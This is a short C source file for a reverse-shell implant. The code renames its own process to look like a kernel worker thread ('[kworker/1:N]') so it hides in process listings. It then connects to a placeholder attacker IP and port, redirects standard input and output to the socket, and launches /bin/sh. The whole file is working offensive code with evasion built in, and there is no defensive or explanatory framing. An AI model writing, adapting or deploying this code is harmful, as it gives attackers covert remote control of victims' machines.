#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>


int main (int argc, char** argv) {
	//overwrite the argv[0] to hide the process. Name it [kworker/1:#] where # is a random number between 0 and 9
	srand(time(NULL));
	int random = rand() % 10;
	char* kworker = "[kworker/1:";
	char* kworker_random = malloc(1 + strlen(kworker) + sizeof(random));
	sprintf(kworker_random, "%s%d]", kworker, random);
	int i = 0;
	for (i = 0; i < strlen(kworker_random); i++) {
		argv[0][i] = kworker_random[i];
	}
	argv[0][i] = '\0';


	const char* ip = REVERSE_SHELL_IP;
	struct sockaddr_in addr;


	addr.sin_family = AF_INET;
	addr.sin_port = htons(REVERSE_SHELL_PORT);
	inet_aton(ip, &addr.sin_addr);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3;i++) {

		dup2(sockfd, i);
	}
	execve("/bin/sh", argv, NULL);

	return 0;

}
